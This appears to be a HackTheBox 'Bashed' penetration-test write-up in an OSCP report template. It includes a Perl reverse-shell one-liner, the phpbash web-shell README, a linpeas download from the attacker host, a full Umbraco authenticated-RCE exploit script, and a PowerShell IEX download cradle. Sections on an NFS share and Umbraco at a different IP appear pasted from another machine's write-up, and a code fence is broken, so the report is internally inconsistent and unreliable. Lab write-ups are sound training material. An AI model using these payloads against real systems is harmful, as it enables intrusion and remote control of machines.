---
title: "Report - HackTheBox - Bashed"
author: ["jurgen.kobierczynski@telenet.be", ""]
date: "2021-01-05"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "hackthebox.com - bashed"
lang: "en"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Pentesting Report - Bashed

## Introduction

The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course.
This report should contain all items that were used to pass the overall exam.
This report will be graded from a standpoint of correctness and fullness to all aspects of the  exam.
The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Exam network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

## Requirements

The student will be required to fill out this penetration testing report and include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

# Sample Report - High-Level Summary

John Doe was tasked with performing an internal penetration test towards Offensive Security Labs.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security's internal lab systems - the **THINC.local** domain.
John's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, John had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:

- Exam Trophy 1 - Got in through X
- Exam Trophy 2 - Got in through X

## Sample Report - Recommendations

John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Sample Report - Methodologies

John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure.
Below is a breakout of how John was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Sample Report - Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, John was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

Host: 10.10.10.68

## Sample Report - Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

# Nmap scan host

```
# Nmap 7.91 scan initiated Tue Jan  5 21:46:18 2021 as: nmap -Pn -sC -sV -p- -oA nmap/bashed-fulltcp 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.028s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  5 21:46:44 2021 -- 1 IP address (1 host up) scanned in 26.61 seconds

```
On browsing the main website we see the following website:

![ImgPlaceholder](screenshots/web-80.png)

on the phpbash link we find the following interesting dynamic screenshot of a webshell:

![ImgPlaceholder](screenshots/phpbash.png)

```
url: https://github.com/Arrexel/phpbash
```
------------

# phpbash
phpbash is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible. The design is based on the default Kali Linux terminal colors, so pentesters should feel right at home.

## Requirements
Javascript must be enabled on the client browser for phpbash to work properly. The target machine must also allow execution of the `shell_exec` PHP function, although it is very simple to modify the script to use an alternate function.

## Features
- Requires only a single PHP file
- POST-based requests
- Support for current working directory
- Command history with arrow keys
- Upload files directly to target directory

Have a feature idea? Open an [Issue](https://github.com/Arrexel/phpbash/issues).

## Custom Commands
- `cd` Return to default shell directory
- `cd <path>` Change directory
- `cd -` Return to previous directory
- `clear` Clears all output
- `upload` Opens the file browser and uploads selected file

## Usage
Simply drop the `phpbash.php` or `phpbash.min.php` file on the target and access it with any Javascript-enabled web browser.

## Screenshots
![phpbash](https://image.prntscr.com/image/q1hExH9ARMOUd4S8oz2pew.png)
![phpbash](https://image.prntscr.com/image/AJ9heVLEQ62xp4CVDPcexA.png)

-------------

# Gobuster directory enumeration

With Gobuster we find the following web directories:

```
/index.html (Status: 200)
/images (Status: 301)
/contact.html (Status: 200)
/about.html (Status: 200)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/config.php (Status: 200)
/fonts (Status: 301)
/single.html (Status: 200)
/scroll.html (Status: 200)
/server-status (Status: 403)
```
on the php web directory we find the following script:

![ImgPlaceholder](screenshots/phpdir.png)

on the dev web directory we find the following scripts:

![ImgPlaceholder](screenshots/devdir.png)

Looks we have found a direct path to a webshell!

## Sample Report - Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems.
During this penetration test, John was able to successfully gain access to the system.
Showmount reported a NFS share 'site_backups' readable to everyone.

```
cd upload
cat perl-reverse.pl 
perl -e 'use Socket;$i="10.10.14.27";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python3 -m http.server 8080
```

We upload a perl-reverse.pl shell to /dev/shm:

![ImgPlaceholder](screenshots/upload-perl-reverse.png)

We change the permission to rwx to everyone (we need execute right):

![ImgPlaceholder](screenshots/chmod-perl-reverse.png)

On our host we open a nc listening connecting on port 9999:

```
nc -lnvp 9999

```

On the bashed host we enter this command in the php shell:
```
/dev/shm/perl-reverse.pl

On our host we receive a reverse shell back:
![ImgPlaceholder](screenshots/reverse-shell.png)

Then we upload a linpeas.sh script and give it execute rights:

```
ser@kali:~/hackthebox/hackthebox/bashed$ nc -lnvp 9999
Listening on 0.0.0.0 9999

Connection received on 10.10.10.68 51286
/bin/sh: 0: can't access tty; job control turned off
$ $ 
$ ls
perl-reverse.pl
$ wget http://10.10.14.27:8080/linpeas.sh
--2021-01-05 13:37:56--  http://10.10.14.27:8080/linpeas.sh
Connecting to 10.10.14.27:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 160486 (157K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... .......... 31%  974K 0s
    50K .......... .......... .......... .......... .......... 63% 2.33M 0s
   100K .......... .......... .......... .......... .......... 95% 2.18M 0s
   150K ......                                                100% 2.77M=0.1s

2021-01-05 13:37:57 (1.58 MB/s) - 'linpeas.sh' saved [160486/160486]

$ ls -l
total 164
-rw-r--r-- 1 www-data www-data 160486 Jan  5 12:39 linpeas.sh
-rwxrwxrwx 1 www-data www-data    222 Jan  5 13:11 perl-reverse.pl
$ chmod +x linpeas.sh
$ ./linpeas.sh | tee linpeas.out
```

We find that www-data (the account we are logged in with) has sudo permission to change to scriptmanager user:

![ImgPlaceholder](screenshots/sudo-www-data.png)

**Vulnerability Fix:**

* Close NSF access
* Remove read access to everyone
* Remove Umbraco backup file

**Severity:** Critical

Browsing to the web directory showed a Umbraco CMS webportal login:


http://10.10.10.180/umbraco/#/login

**RCE Umbraco:

```
searchsploit umbraco
--------------
 Exploit Title                                                             
--------------
Umbraco CMS - Remote Command Execution (Metasploit)               | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution        | aspx/webapps/46153.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting        | php/webapps/44988.txt
--------------
Shellcodes: No Results
Papers: No Results

```

**Proof of Concept Code Here:**

```
# Date: 2020-03-28
# Exploit Author: Alexandre ZANNI (noraj)
# Based on: https://www.exploit-db.com/exploits/46153
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig

import requests
import re
import argparse

from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(prog='exploit.py',
    description='Umbraco authenticated RCE',
    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
parser.add_argument('-u', '--user', metavar='USER', type=str,
    required=True, dest='user', help='username / email')
parser.add_argument('-p', '--password', metavar='PASS', type=str,
    required=True, dest='password', help='password')
parser.add_argument('-i', '--host', metavar='URL', type=str, required=True,
    dest='url', help='root URL')                                                                                                                          
parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,                                                                            
    dest='command', help='command')                                                                                                                       
parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,                                                                        
    dest='arguments', help='arguments', default='')                                                                                                       
args = parser.parse_args()                                                                                                                                
                                                                                                                                                          
# Payload                                                                                                                                                 
payload = """\                                                                                                                                            
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>\                                               
""" % (args.arguments, args.command)                                                                                                                      
                                                                                                                                                          
login = args.user                                                                                                                                         
password = args.password                                                                                                                                  
host = args.url                                                                                                                                           
                                                                                                                                                          
http_proxy  = "http://127.0.0.1:8080"                                                                                                                     
https_proxy  = "http://127.0.0.1:8080"                                                                                                                    
ftp_proxy  = "http://127.0.0.1:8080"                                                                                                                      
                                                                                                                                                          
proxyDict = {                                                                                                                                             
                      "http"  : http_proxy,                                                                                                               
                      "https" : https_proxy,                                                                                                              
                      "ftp"   : ftp_proxy                                                                                                                 
                                                                                                                                                          
}                                                                                                                                                         
                                                                                                                                                          
# Process Login                                                                                                                                           
url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"                                                                              
loginfo = { "username": login, "password": password}                                                                                                      
s = requests.session()                                                                                                                                    
r2 = s.post(url_login,json=loginfo, proxies=proxyDict )                                                                                                   
                                                                                                                                                          
# Go to vulnerable web page                                                                                                                               
url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"                                                                                            
r3 = s.get(url_xslt, proxies=proxyDict)                                                                                                                   
                                                                                                                                                          
soup = BeautifulSoup(r3.text, 'html.parser')                                                                                                              
VIEWSTATE = soup.find(id="__VIEWSTATE")['value']                                                                                                          
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,
    "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
    "ctl00$body$xsltSelection": payload,
    "ctl00$body$contentPicker$ContentIdValue": "",
    "ctl00$body$visualizeDo": "Visualize+XSLT" }

# Launch the attack
r4 = s.post(url_xslt, data=data, headers=headers, proxies=proxyDict)
# Filter output
soup = BeautifulSoup(r4.text, 'html.parser')
CMDOUTPUT = soup.find(id="result").getText()
print(CMDOUTPUT)
```
# Execution exploit

```
python3 -m http.server 8080
python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c 'powershell.exe' -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27:8000/reverse.ps1')"
```



![ImgPlaceholder](src/placeholder-image-300x225.png)

\newpage

## Sample Report - Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

John added administrator and root level accounts on all systems compromised.
In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

## Sample Report - House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on the exam network were completed, John removed all user accounts and passwords as well as the meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items Not Mentioned in the Report

This section is placed for any additional items that were not mentioned in the overall report.
